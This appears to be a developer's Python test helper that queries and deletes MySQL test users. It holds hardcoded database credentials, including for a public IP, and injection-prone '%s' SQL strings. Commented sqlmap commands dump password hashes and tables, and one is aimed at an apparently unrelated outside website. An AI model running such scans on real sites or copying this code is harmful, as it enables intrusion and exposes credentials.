# -*- coding: utf-8 -*-
# @Time    : 2018/10/12 上午10:39
# @Author  : ShaHeTop-Almighty-ares
# @Email   : yang6333yyx@126.com
# @File    : db_operation.py
# @Software: PyCharm

import pymysql  # 导入 pymysql
import logging

# 打开数据库连接
HuntingBall = pymysql.connect(host="localhost", user="root",
                              password="123456", db="HuntingBall", port=3306)

db = pymysql.connect(host="120.79.145.200", user="tiger_test",
                     password="123123", db="tiger_test", port=3306)


# python sqlmap.py -d "mysql+pymysql://tiger_test:123123@120.79.145.200:3306/tiger_test"
# python sqlmap.py -d "mysql://tiger_test:123123@120.79.145.200:3306/tiger_test"
# python sqlmap.py -d "mysql://tiger_test:123123@120.79.145.200:3306/tiger_test"
# python sqlmap.py -d "mysql://root:123456@127.0.0.1:3306/HuntingBallApp"
# https://openingsource.org/914/
#
# python sqlmap.py -u "http://0.0.0.0:9999/v1/api/register/vZ48TadPPiHsh7jnxUFgyg" --batch
# python sqlmap.py -u "http://0.0.0.0:9999/v1/api/register/vZ48TadPPiHsh7jnxUFgyg" –current-db
# python sqlmap.py -u "http://0.0.0.0:9999/v1/api/register/vZ48TadPPiHsh7jnxUFgyg" --current-db --batch
#
# # ex
# python sqlmap.py -u "http://0.0.0.0:9999/v1/api/register/vZ48TadPPiHsh7jnxUFgyg"  --batch --banner
#
# python sqlmap.py -u "https://gdzx.airmcl.com/air-gdzx/mddindex/service/banner?cityId=127" --batch --banner --tamper=space2comment --level=5 --risk=3
#
# python sqlmap.py -u "http://0.0.0.0:9999/v1/api/register/vZ48TadPPiHsh7jnxUFgyg"  --batch --passwords
# python sqlmap.py -u "http://0.0.0.0:9999/v1/api/register/vZ48TadPPiHsh7jnxUFgyg"  --batch --dbs
# python sqlmap.py -u "http://0.0.0.0:9999/v1/api/register/vZ48TadPPiHsh7jnxUFgyg"  --batch --tables -D gambler

def s(acc):
    sql = ''
    if '@' in acc:
        sql = "select * from t_users where email='%s'" % acc
    else:
        sql = "select * from t_users where phone='%s'" % acc
    try:
        with db.cursor() as cur:
            db.ping(reconnect=True)
            cur.execute(sql)

        results = cur.fetchall()  # 获取查询的所有记录
        """————————————————————"""
        d = {}
        k = cur.description  # 字段名称
        r = results[0]  # 值

        for i, j in zip(k, r):
            d[i[0]] = j
        print(d)
        # print(results[0])
        # for i in results[0]:
        #     print('key', i)
        # if results:
        #     del_test_data(acc)
        # else:
        #     pass
        # print(results)
    except Exception as e:
        raise e
    # finally:
    #     db.close()  # 关闭连接


def del_test_data(acc):
    # 使用cursor()方法获取操作游标
    # cur = db.cursor()

    sql_delete = ''

    if '@' in acc:
        sql_delete = "delete from t_users where email = '%s'" % acc
        logging.info('===sql:%s===' % sql_delete)
    else:
        sql_delete = "delete from t_users where phone = '%s'" % acc
        logging.info('===sql:%s===' % sql_delete)

    with db.cursor() as cur:
        db.ping(reconnect=True)
        cur.execute(sql_delete)
        logging.info('===del test data success===')

    try:
        # 提交
        db.commit()
    except Exception as e:
        # 错误回滚
        print(e)
        db.rollback()

    # finally:
    #     db.close()


if __name__ == '__main__':
    # def ii():
    #     # 使用cursor()方法获取操作游标
    #     cur = db.cursor()
    #     print('1')
    #     sql_insert = """insert into t_users(phone) values('13533385515')"""
    #     sql_insert2 = """insert into t_users(email) values('yangyuexiongaini@126.com')"""
    #     print('2')
    #     try:
    #         cur.execute(sql_insert)
    #         cur.execute(sql_insert2)
    #         print('ok')
    #         # 提交
    #         db.commit()
    #     except Exception as e:
    #         # 错误回滚
    #         db.rollback()
    #     finally:
    #         db.close()

    # ii()
    # del_test_data('13533385515')
    # del_test_data('yangyuexiongaini@126.com')
    s('b@126.com')
    # s('yangyuexiongaini@126.com')
